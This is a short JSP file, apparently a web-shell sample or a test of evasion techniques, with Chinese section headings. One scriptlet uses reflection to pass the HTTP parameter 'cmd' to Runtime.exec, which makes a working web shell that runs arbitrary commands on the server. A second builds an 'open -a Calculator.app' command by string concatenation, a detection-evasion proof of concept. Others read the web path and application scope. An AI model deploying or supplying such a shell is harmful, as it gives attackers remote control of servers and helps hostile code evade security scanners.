<%@ page language="java" contentType="text/html; charset=utf-8" pageEncoding="utf-8" %>
<h1> Scriptlet 标记写法 </h1>


<h1>反射构造Runtime</h1>
<% "".getClass().forName("java.lang.Runtime").getMethod("exec", "".getClass()).invoke("".getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null), request.getParameter("cmd"));%>

<h1>拼接</h1>
<% Runtime.getRuntime().exec(Character.toString((char) 111).concat("pen -a Calculator.app")); %>

<h1>web路径</h1>
<%pageContext.servletContext.getResource("");%>

<h1>环境变量</h1>
<%applicationScope;%>